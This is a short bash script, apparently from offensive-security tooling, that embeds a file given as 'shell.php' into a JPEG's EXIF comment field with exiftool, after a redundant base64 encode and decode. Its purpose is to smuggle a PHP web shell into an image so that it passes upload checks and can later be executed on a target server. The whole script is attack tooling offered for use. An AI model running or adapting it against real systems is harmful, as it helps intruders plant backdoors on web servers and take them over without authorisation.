#!/bin/bash
if [[ $1 == "" || $2 == "" ]];then
	echo "Usage : $0 shell.php resim.jpg"
	exit
elif [[ ! -f $1 || ! -f $2 ]];then
	echo "Usage : $0 shell.php resim.jpg"
	exit
fi
if [[ -f .w0rnix.txt ]];then
	rm .w0rnix.txt
fi
base64 $1 >> .w0rnix.txt
yorum=$(base64 -d <<< `cat .w0rnix.txt`)
exiftool -comment="$yorum" $2
rm .w0rnix.txt